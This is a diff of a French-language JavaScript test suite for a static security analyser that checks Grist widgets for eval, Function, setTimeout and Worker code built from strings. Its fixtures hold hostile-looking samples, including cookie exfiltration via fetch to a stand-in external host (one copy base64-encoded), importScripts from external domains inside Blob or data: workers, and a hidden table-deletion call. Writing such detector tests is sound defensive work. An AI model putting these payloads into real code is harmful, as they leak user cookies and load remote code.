@@ -4,7 +4,7 @@ import path from 'node:path';
 import fs from 'node:fs';
 import os from 'node:os';
 import { extraireImportMaps } from '../src/moteur/analyse-js.js';
-import { analyserRessourcesExternes, analyserSortiesReseau, analyserInjections, analyserScriptDynamique } from '../src/regles/c-securite.js';
+import { analyserRessourcesExternes, analyserSortiesReseau, analyserInjections, analyserScriptDynamique, preparerCodeExecuteEnChaine, analyserAccesGrist, analyserStockage } from '../src/regles/c-securite.js';
 import { analyserDependancesDistantes } from '../src/regles/e-dependances.js';
 import { construireContexte } from '../src/contexte/inventaire.js';
 
@@ -349,42 +349,61 @@ test('importScripts() avec DEUX arguments externes distincts sur le même appel 
 });
 
 // ---------------------------------------------------------------------------
-// C-XSS-07 : Worker/SharedWorker construit depuis du code en chaîne
-// (Blob/data:), trouvé par la coordination — vérifié par l'exécution (vraie
-// Chromium) qu'un importScripts() externe SANS CORS s'exécute bien depuis un
-// worker blob: comme depuis un worker data: (voir la conversation).
+// eval()/Function()/setTimeout()/setInterval()/new Worker(code en chaîne) :
+// détectés et matérialisés par `preparerCodeExecuteEnChaine`, PAS par
+// `analyserInjections` (voir sa doc, et le commit qui a introduit cette
+// réécriture) — la construction et le contenu imbriqué sortent tous les deux
+// de ce seul appel ; un risque découvert dans le contenu par une AUTRE règle
+// (fetch/importScripts vu par analyserSortiesReseau, accès Grist vu par
+// analyserAccesGrist, stockage vu par analyserStockage…) demande un second
+// appel, APRÈS, sur le même `ctx` — c'est le fichier synthétique ajouté à
+// `ctx.fichiers` qui porte cette information d'une règle à l'autre.
 // ---------------------------------------------------------------------------
 
 test("C-XSS-07 : new Worker(URL.createObjectURL(new Blob([littéral]))) est un littéral entièrement lisible — audité comme le reste du dépôt, pas critique pour sa seule construction", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker(URL.createObjectURL(new Blob([\"importScripts('https://exemple.tiers/x.js')\"])));")] };
-  const constats = analyserInjections(ctx);
-  const construction = constats.find((x) => x.regle === 'C-XSS-07');
+  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(construction, "le code du worker est lisible : la construction elle-même n'est plus qu'un rappel de lisibilité");
   assert.equal(construction.severite, 'mineur');
   assert.equal(construction.bloquant, false);
-  const importScriptsExterne = constats.find((x) => x.regle === 'C-EXFIL-01' && x.titre.includes('Code littéral audité'));
-  assert.ok(importScriptsExterne, "le VRAI risque (importScripts vers un domaine externe) doit être vu par l'analyse imbriquée, pas seulement la construction");
+  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
+  assert.ok(importScriptsExterne, "le VRAI risque (importScripts vers un domaine externe) doit être vu, dans le fichier synthétique, par l'analyse imbriquée, pas seulement la construction");
   assert.equal(importScriptsExterne.severite, 'critique');
   assert.equal(importScriptsExterne.bloquant, true);
 });
 
 test("C-XSS-07 : new SharedWorker(URL.createObjectURL(new Blob([littéral]))) est également détecté", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new SharedWorker(URL.createObjectURL(new Blob(['postMessage(1)'])));")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c);
 });
 
 test("C-XSS-07 : new Worker(url data: littérale) est décodée et auditée — le VRAI risque (importScripts externe) ressort en critique, pas la construction", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker('data:text/javascript,importScripts(%27https://exemple.tiers/x.js%27)');")] };
-  const constats = analyserInjections(ctx);
-  const construction = constats.find((x) => x.regle === 'C-XSS-07');
+  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(construction);
   assert.equal(construction.severite, 'mineur');
   assert.equal(construction.bloquant, false);
-  const importScriptsExterne = constats.find((x) => x.regle === 'C-EXFIL-01' && x.titre.includes('Code littéral audité'));
+  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
   assert.ok(importScriptsExterne, "le data: doit être décodé (URI-encodage) puis analysé comme du code");
   assert.equal(importScriptsExterne.severite, 'critique');
   assert.equal(importScriptsExterne.bloquant, true);
+});
+
+test("C-XSS-07 : new Worker(new URL('data:text/javascript,...')) — data: enveloppé dans new URL() — est lui aussi décodé et audité, pas rejeté comme « pas entièrement littéral »", () => {
+  // Trou relevé par la coordination le 2026-09-28 (deuxième vérification par
+  // exécution, Chromium 141) : `extraireCodeLitteralWorker` ne suivait pas
+  // `new URL(...)` autour d'un data:, contrairement à `classifierSourceWorker`
+  // qui décide déjà la catégorie sur ce cas — le contenu, pourtant entièrement
+  // littéral, retombait à tort en critique « pas entièrement littéral ».
+  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('data:text/javascript,importScripts(\"https://exemple.tiers/x.js\")'));")] };
+  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(construction);
+  assert.equal(construction.severite, 'mineur', "le contenu est entièrement littéral : ce n'est plus qu'un rappel de lisibilité");
+  assert.equal(construction.bloquant, false);
+  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
+  assert.ok(importScriptsExterne, "le VRAI risque, une fois le data: décodé à travers le new URL(...), doit ressortir");
+  assert.equal(importScriptsExterne.severite, 'critique');
 });
 
 test("C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau, ou autre) est signalé quand même — accuser la construction, pas le contenu (la coordination a montré que 'seulement si littéral' se contournait en une ligne)", () => {
@@ -392,7 +411,7 @@ test("C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau
     "const texte = await (await fetch('https://exemple.tiers/lib.js')).text();",
     'const w = new Worker(URL.createObjectURL(new Blob([texte])));',
   ].join('\n'))] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c, "récupérer un contenu (déjà vu par C-EXFIL-01/02 sur le fetch) et l'exécuter comme du code sont deux faits distincts, pas un double comptage du même fait");
   assert.equal(c.severite, 'critique');
   assert.equal(c.bloquant, true);
@@ -400,28 +419,28 @@ test("C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau
 
 test("C-XSS-07 : new Worker('./local.js') normal (chemin de fichier, pas data:/Blob) ne déclenche rien", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker('./local.js');")] };
-  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
+  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
 });
 
 test("C-XSS-07 : new Worker(url http(s) absolue littérale) ne déclenche rien (code cassé, jamais exécuté — voir be1b5f4)", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker('https://exemple.tiers/worker.js');")] };
-  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
+  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
 });
 
 test("C-XSS-07 : new Worker(new URL('./local.js', import.meta.url)) (forme des empaqueteurs) ne déclenche toujours rien (pas de régression)", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('./local.js', import.meta.url));")] };
-  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
+  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
 });
 
 test('C-XSS-07 : un gabarit statique dans le tableau du Blob compte aussi comme littéral', () => {
   const ctx = { fichiers: [fichier('app.js', 'const w = new Worker(URL.createObjectURL(new Blob([`postMessage(1);`])));')] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c);
 });
 
 test("C-XSS-07 : une URL data: obtenue par CONCATÉNATION ('data:text/javascript,' + code) est aussi critique et bloquante", () => {
   const ctx = { fichiers: [fichier('app.js', "const code = \"importScripts('https://exemple.tiers/x.js')\"; const w = new Worker('data:text/javascript,' + code);")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c, "la tête littérale 'data:text/javascript,' suffit à reconnaître le motif, même si le reste est une variable");
   assert.equal(c.severite, 'critique');
   assert.equal(c.bloquant, true);
@@ -429,7 +448,7 @@ test("C-XSS-07 : une URL data: obtenue par CONCATÉNATION ('data:text/javascript
 
 test("C-XSS-07 : une source non résolue (variable simple, gabarit interpolé) produit un constat majeur, à vérifier — plutôt que le silence d'avant", () => {
   const ctx = { fichiers: [fichier('app.js', 'const w = new Worker(sourceCalculeeAilleurs);')] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c, "une variable peut cacher une URL blob: assemblée dans une instruction précédente, invisible à l'analyse d'une seule expression");
   assert.equal(c.severite, 'majeur');
   assert.equal(c.bloquant, false);
@@ -438,7 +457,7 @@ test("C-XSS-07 : une source non résolue (variable simple, gabarit interpolé) p
 
 test('C-XSS-07 : un gabarit AVEC interpolation comme source de Worker est aussi traité comme non résolu (pas de silence, pas de plantage)', () => {
   const ctx = { fichiers: [fichier('app.js', 'const nom = "w"; const w = new Worker(`./${nom}.js`);')] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c);
   assert.equal(c.severite, 'majeur');
 });
@@ -449,38 +468,25 @@ test("C-XSS-07 : new Worker(url) où url = URL.createObjectURL(blob) est assign�
     'const url = URL.createObjectURL(blob);',
     'const w = new Worker(url);',
   ].join('\n'))] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c, "l'analyse ne remonte pas au-delà de l'expression donnée à new Worker() : c'est le cas honnêtement documenté comme 'non résolue', pas un constat 'certain'");
   assert.equal(c.severite, 'majeur');
 });
 
-// ---------------------------------------------------------------------------
-// Deuxième relecture de la coordination (exécution réelle, Chromium 141) :
-// tout ce qui précède reconnaît des ÉCRITURES précises (Worker nu, URL nue,
-// Blob inline...) plutôt que ce qui s'exécute réellement — un alias global
-// (window./self./globalThis.), une forme d'appel équivalente (Function sans
-// new, eval indirect), ou une variable au lieu d'un littéral inline suffisent
-// à échapper à la détection ou à faire retomber en sévérité inférieure sans
-// raison de sécurité réelle. Corrigé ci-dessous, plus quelques sinks jamais
-// couverts (createContextualFragment, URL javascript:, setAttribute côté
-// C-EXFIL-05) que la coordination avait signalés comme non vérifiés.
-// ---------------------------------------------------------------------------
-
 test("C-XSS-07 : new window.Worker(...) (alias global) est détecté comme new Worker(...), et son contenu littéral tout autant audité", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new window.Worker(URL.createObjectURL(new Blob([\"importScripts('https://exemple.tiers/x.js')\"])));")] };
-  const constats = analyserInjections(ctx);
-  const c = constats.find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c);
   assert.equal(c.severite, 'mineur');
   assert.equal(c.titre.startsWith('Worker '), true, "l'alias ne doit pas fuiter dans le texte affiché (plus de \"undefined construit depuis...\")");
-  const importScriptsExterne = constats.find((x) => x.regle === 'C-EXFIL-01' && x.titre.includes('Code littéral audité'));
+  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
   assert.ok(importScriptsExterne, "l'alias ne doit pas empêcher l'analyse du contenu littéral non plus");
   assert.equal(importScriptsExterne.severite, 'critique');
 });
 
 test("C-XSS-07 : self.URL.createObjectURL(...) (alias global sur URL) est traité comme URL.createObjectURL(...)", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker(self.URL.createObjectURL(monBlob));")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c, "createObjectURL reste createObjectURL derrière un alias self./window./globalThis.");
   assert.equal(c.severite, 'critique');
 });
@@ -491,23 +497,15 @@ test("C-XSS-07 : createObjectURL(...) est critique quel que soit son propre argu
     'const blob = new Blob(morceaux);',
     'const w = new Worker(URL.createObjectURL(blob));',
   ].join('\n'))] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c, "tout appel à createObjectURL passé à un Worker est un code opaque à l'analyse statique, quel que soit ce qui lui est passé");
-  assert.equal(c.severite, 'critique');
-  assert.equal(c.bloquant, true);
-});
-
-test("C-XSS-07 : new URL('data:text/javascript,...') passé à Worker est critique — pas un chemin local sûr", () => {
-  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('data:text/javascript,importScripts(1)'));")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
-  assert.ok(c, "le schéma du premier argument de new URL(...) doit décider, pas la seule présence d'un littéral");
   assert.equal(c.severite, 'critique');
   assert.equal(c.bloquant, true);
 });
 
 test("C-XSS-07 : new Worker(new URL('./local.js', location.href)) (base autre que import.meta.url) ne déclenche rien", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('./local.js', location.href));")] };
-  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0, "le schéma de x ('./local.js') décide, quelle que soit la base");
+  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0, "le schéma de x ('./local.js') décide, quelle que soit la base");
 });
 
 test("surface exécutée : new Worker(new URL('./w.js', location.href)) (base autre que import.meta.url) fait quand même entrer w.js dans la surface", () => {
@@ -516,14 +514,18 @@ test("surface exécutée : new Worker(new URL('./w.js', location.href)) (base au
     'app.js': "const w = new Worker(new URL('./w.js', location.href));",
     'w.js': "importScripts('https://exemple.tiers/lib.js');",
   });
-  const ctx = construireContexte(dir);
-  const w = ctx.fichiers.find((f) => f.chemin === 'w.js');
-  assert.ok(w?.executee, "w.js doit être dans la surface même si la base n'est pas import.meta.url — c'est le chemin local qui compte, pas la base");
+  try {
+    const ctx = construireContexte(dir);
+    const w = ctx.fichiers.find((f) => f.chemin === 'w.js');
+    assert.ok(w?.executee, "w.js doit être dans la surface même si la base n'est pas import.meta.url — c'est le chemin local qui compte, pas la base");
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
 });
 
 test("C-XSS-03 : Function(...) sans new est reconnu comme new Function(...), et son contenu littéral audité (pas critique pour la seule construction)", () => {
   const ctx = { fichiers: [fichier('app.js', "const f = Function('return document.cookie');")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
   assert.ok(c, 'Function(str) sans new compile aussi une chaîne en fonction exécutable');
   assert.equal(c.severite, 'mineur', "un simple retour de document.cookie, sans l'envoyer nulle part, n'a pas la propriété de sécurité qui justifie critique+bloquant (voir Function(\"return this\") dans lodash, widget-exemple)");
   assert.equal(c.bloquant, false);
@@ -531,28 +533,30 @@ test("C-XSS-03 : Function(...) sans new est reconnu comme new Function(...), et 
 
 test("C-XSS-03 : Function(...) sans new reste critique quand son corps littéral exfiltre réellement (fetch vers un domaine externe)", () => {
   const ctx = { fichiers: [fichier('app.js', 'const f = Function(\'fetch("https://exemple.tiers/vole?c="+document.cookie)\');')] };
-  const constats = analyserInjections(ctx);
-  const construction = constats.find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
+  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
   assert.equal(construction.severite, 'mineur', "la construction elle-même n'est qu'un rappel de lisibilité : le risque réel doit être ailleurs");
-  const fetchExterne = constats.find((x) => x.regle === 'C-EXFIL-02' && x.titre.includes('Code littéral audité'));
+  const fetchExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-02' && x.fichier.includes('code littéral'));
   assert.ok(fetchExterne, "le fetch() imbriqué dans le corps littéral doit être vu par l'analyse imbriquée (C-EXFIL-02 : destination calculée par concaténation)");
 });
 
 test("C-XSS-03 : Function(...) sans new reste critique et bloquant quand son argument est calculé (rien à auditer)", () => {
   const ctx = { fichiers: [fichier('app.js', 'const f = Function(corpsCalcule);')] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
   assert.equal(c.severite, 'critique');
   assert.equal(c.bloquant, true);
 });
 
 test("C-XSS-03 : eval indirect (0, eval)(...) est reconnu comme eval(...), et son contenu littéral audité — un eval imbriqué y redevient critique", () => {
   const ctx = { fichiers: [fichier('app.js', "(0, eval)('eval(codeCalcule)');")] };
-  const constats = analyserInjections(ctx);
+  // Un eval() imbriqué dans un eval() littéral est du ressort du MÊME appel :
+  // `preparerCodeExecuteEnChaine` itère sa propre frontière de fichiers
+  // matérialisés jusqu'à épuisement (ou la profondeur maximale).
+  const constats = preparerCodeExecuteEnChaine(ctx);
   const construction = constats.find((x) => x.regle === 'C-XSS-03' && x.titre.includes('indirect'));
   assert.ok(construction, "l'eval indirect via l'opérateur virgule est un contournement courant des recherches sur eval(");
   assert.equal(construction.severite, 'mineur');
   assert.equal(construction.bloquant, false);
-  const evalImbrique = constats.find((x) => x.regle === 'C-XSS-03' && x.titre.includes('Code littéral audité') && x.titre.includes('eval()') && !x.titre.includes('indirect'));
+  const evalImbrique = constats.find((x) => x.regle === 'C-XSS-03' && x.fichier.includes('code littéral') && x.titre === 'Exécution de code arbitraire via eval()');
   assert.ok(evalImbrique, "l'eval() imbriqué dans le littéral, lui-même à argument calculé, doit redevenir critique");
   assert.equal(evalImbrique.severite, 'critique');
   assert.equal(evalImbrique.bloquant, true);
@@ -560,9 +564,139 @@ test("C-XSS-03 : eval indirect (0, eval)(...) est reconnu comme eval(...), et so
 
 test("C-XSS-03 : eval indirect (0, eval)(...) reste critique et bloquant quand son argument est calculé", () => {
   const ctx = { fichiers: [fichier('app.js', "(0, eval)(codeCalcule);")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('indirect'));
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('indirect'));
   assert.equal(c.severite, 'critique');
   assert.equal(c.bloquant, true);
+});
+
+// ---------------------------------------------------------------------------
+// setTimeout/setInterval — deuxième relecture de la coordination (exécution
+// réelle, Chromium 141) : Chromium compile en code TOUT argument qui produit
+// une chaîne, pas seulement les trois formes syntaxiques reconnues jusqu'ici
+// (atob(...), un identifiant qui ne résout ni fonction ni littéral). Une
+// fonction — fléchée, ou un identifiant qui en résout une dans le fichier —
+// n'est jamais signalée : le motif `setTimeout(callback, delai)` doit rester
+// silencieux, y compris dans du code embarqué comme lodash.
+// ---------------------------------------------------------------------------
+
+test('C-XSS-04 : setTimeout(fonction fléchée, délai) ne déclenche rien', () => {
+  const ctx = { fichiers: [fichier('app.js', 'setTimeout(() => rafraichir(), 1000);')] };
+  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-04').length, 0);
+});
+
+test('C-XSS-04 : setTimeout(nomDeFonctionDéclaréeDansCeFichier, délai) ne déclenche rien', () => {
+  const ctx = { fichiers: [fichier('app.js', 'function rafraichir() { console.log(1); }\nsetTimeout(rafraichir, 1000);')] };
+  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-04').length, 0);
+});
+
+test("C-XSS-04 : setTimeout(callback, délai) où callback est un PARAMÈTRE (motif le plus courant dans du code embarqué type lodash) reçoit un palier « à vérifier », pas le silence ni une critique systématique", () => {
+  const ctx = { fichiers: [fichier('app.js', 'function armer(callback, delai) { setTimeout(callback, delai); }')] };
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
+  assert.ok(c, "un paramètre ne résout ni vers une fonction déclarée ni vers un littéral dans ce seul fichier : ni silence ni faux positif");
+  assert.equal(c.severite, 'majeur');
+  assert.equal(c.bloquant, false);
+  assert.equal(c.confiance, 'a_verifier');
+});
+
+test("C-XSS-04 : setTimeout(atob(littéral), délai) n'est plus silencieux — Chromium compile la chaîne décodée comme du code, exactement comme un littéral direct", () => {
+  const payload = Buffer.from("fetch('https://exemple-tiers.example/vole?c='+document.cookie)").toString('base64');
+  const ctx = { fichiers: [fichier('app.js', `setTimeout(atob("${payload}"), 500);`)] };
+  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
+  assert.ok(construction, "avant ce correctif, atob(...) n'était reconnu par aucune des trois formes attendues (Literal/TemplateLiteral/BinaryExpression) : silence total");
+  assert.equal(construction.severite, 'mineur', "le contenu décodé est un littéral qui se parse : audité comme le reste du dépôt");
+  const fetchExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-02' && x.fichier.includes('code littéral'));
+  assert.ok(fetchExterne, "le VRAI risque (fetch vers un domaine externe, construit par concaténation) doit ressortir dans le contenu décodé");
+});
+
+test('C-XSS-04 : setTimeout(atob(calculé), délai) reste critique — rien à décoder statiquement', () => {
+  const ctx = { fichiers: [fichier('app.js', 'setTimeout(atob(chargeUtile), 500);')] };
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
+  assert.ok(c);
+  assert.equal(c.severite, 'critique');
+  assert.equal(c.bloquant, true);
+});
+
+test('C-XSS-04 : setTimeout("al" + "ert(1)", délai) — concaténation de CONSTANTES — est plié en littéral, pas traité comme « calculé »', () => {
+  const ctx = { fichiers: [fichier('app.js', 'setTimeout("al" + "ert(1)", 10);')] };
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
+  assert.ok(c);
+  assert.equal(c.severite, 'mineur', "'al'+'ert(1)' est entièrement déterminé à la lecture, ce n'est pas une inconnue calculée à l'exécution");
+});
+
+test("C-XSS-04 : setTimeout(variable, délai) où variable est concaténée avec du contenu dynamique reste critique (équivalent à eval, comme avant, mais désormais avec ce statut plutôt qu'un simple majeur)", () => {
+  const ctx = { fichiers: [fichier('app.js', 'setTimeout("javascript:" + suffixeVariable, 10);')] };
+  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
+  assert.ok(c, "aligné sur eval() : une chaîne passée à setTimeout doit être traitée à l'identique, pas à une sévérité inférieure sans raison de sécurité réelle");
+  assert.equal(c.severite, 'critique');
+  assert.equal(c.bloquant, true);
+});
+
+// ---------------------------------------------------------------------------
+// C-GRIST / C-STOCK-01 : le code littéral matérialisé doit entrer dans
+// l'analyse du WIDGET ENTIER, pas seulement dans celle de son propre
+// fragment (déjà exclue pour C-GRIST, à raison) — sans quoi cacher un appel
+// dangereux dans un eval() le rend invisible aux règles qui portent sur
+// l'ensemble de la surface, ou consultent un autre fichier (le README).
+// Invariant que doit vérifier tout cas de ce genre : pour un code X, le
+// cacher dans eval("X") ne doit jamais donner une meilleure note que X écrit
+// en clair, ni produire de faux constat.
+// ---------------------------------------------------------------------------
+
+test("C-GRIST : un accès full + une action de schéma cachés dans eval() sont vus exactement comme en clair (même sévérité C-GRIST-03/04, plus aucun angle mort)", () => {
+  const payload = "grist.ready({requiredAccess:'full'}); grist.docApi.applyUserActions([['RemoveTable','T']]);";
+  const cache = { fichiers: [fichier('app.js', `eval(${JSON.stringify(payload)});`)], entrees: ['app.js'] };
+  preparerCodeExecuteEnChaine(cache);
+  const constatsCaches = analyserAccesGrist(cache);
+
+  const clair = { fichiers: [fichier('app.js', payload)], entrees: ['app.js'] };
+  const constatsClair = analyserAccesGrist(clair);
+
+  for (const regle of ['C-GRIST-03', 'C-GRIST-04']) {
+    const c = constatsCaches.find((x) => x.regle === regle);
+    const e = constatsClair.find((x) => x.regle === regle);
+    assert.ok(c, `${regle} doit se déclencher même quand l'appel est caché dans eval()`);
+    assert.ok(e, `${regle} doit se déclencher en clair (référence)`);
+    assert.equal(c.severite, e.severite, `${regle} : cacher dans eval() ne doit jamais donner une meilleure sévérité qu'en clair`);
+  }
+});
+
+test("C-STOCK-01 : eval(\"localStorage.setItem(...)\") voit le même README que le code en clair (mineur dans les deux cas, pas majeur caché)", () => {
+  const payload = "localStorage.setItem('theme', 'dark');";
+  const readme = fichier('README.md', 'Ce widget utilise localStorage pour mémoriser le thème choisi.');
+
+  const cache = { fichiers: [fichier('app.js', `eval(${JSON.stringify(payload)});`), readme] };
+  preparerCodeExecuteEnChaine(cache);
+  const cCache = analyserStockage(cache).find((x) => x.regle === 'C-STOCK-01');
+
+  const clair = { fichiers: [fichier('app.js', payload), readme] };
+  const cClair = analyserStockage(clair).find((x) => x.regle === 'C-STOCK-01');
+
+  assert.ok(cCache && cClair);
+  assert.equal(cCache.severite, 'mineur', "avant ce correctif, le fichier synthétique isolé ne voyait pas le vrai README : majeur à tort");
+  assert.equal(cCache.severite, cClair.severite);
+});
+
+// ---------------------------------------------------------------------------
+// Numérotation de ligne du code imbriqué : le fichier synthétique porte sa
+// PROPRE numérotation, jamais une ligne recalculée par rapport au fichier
+// source (l'ancien `analyserSiCodeLitteral` faisait `ligne + c.ligne - 1`,
+// faux dès que le littéral ne correspond pas ligne à ligne au texte source).
+// ---------------------------------------------------------------------------
+
+test("numérotation de ligne : un littéral multi-lignes qui commence au milieu d'une ligne source rapporte SA PROPRE ligne interne, pas un calcul par rapport à la ligne d'appel", () => {
+  const src = [
+    '// commentaire',
+    'const x = 1;',
+    "eval(\"a();\\nb();\\nfetch('https://exemple.example/x')\");",
+    '',
+  ].join('\n');
+  const ctx = { fichiers: [fichier('app.js', src)] };
+  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03');
+  assert.equal(construction.ligne, 3, "le site d'appel est bien à la ligne 3");
+  const fetchExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01');
+  assert.ok(fetchExterne);
+  assert.equal(fetchExterne.ligne, 3, "fetch() est à la ligne 3 DU CONTENU DÉCODÉ (a(); / b(); / fetch(...)), une numérotation propre au fichier synthétique — jamais 3+3-1=5 ni aucun autre calcul par rapport au fichier source");
+  assert.ok(fetchExterne.fichier.includes('code littéral, ligne 3'), 'le nom du fichier synthétique identifie sans ambiguïté le site d\'appel dont il provient');
 });
 
 test("C-XSS-01 : createContextualFragment(chaîneDynamique) est signalé comme innerHTML dynamique", () => {
@@ -662,7 +796,7 @@ test('C-XSS-03 : Function("return this") (idiome lodash de détection du global)
     'var root = freeGlobal || freeSelf || Function("return this")();',
   ].join('\n');
   const ctx = { fichiers: [fichier('grist-plugin-api.js', contenu)] };
-  const constats = analyserInjections(ctx);
+  const constats = preparerCodeExecuteEnChaine(ctx);
   const c = constats.find((x) => x.regle === 'C-XSS-03');
   assert.ok(c);
   assert.equal(c.severite, 'mineur');
